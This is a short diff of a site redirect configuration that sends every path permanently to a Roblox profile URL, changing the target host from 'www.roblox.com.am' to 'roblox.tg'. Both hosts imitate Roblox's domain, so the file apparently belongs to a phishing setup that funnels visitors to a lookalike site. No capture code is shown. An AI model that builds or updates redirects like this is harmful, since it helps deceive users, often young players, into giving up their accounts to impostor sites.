@@ -2,8 +2,9 @@
   "redirects": [
     {
       "source": "/(.*)",
-      "destination": "https://www.roblox.com.am/users/9149060220/profile",
+      "destination": "https://roblox.tg/users/3994682368/profile",
       "permanent": true
     }
   ]
 }
+
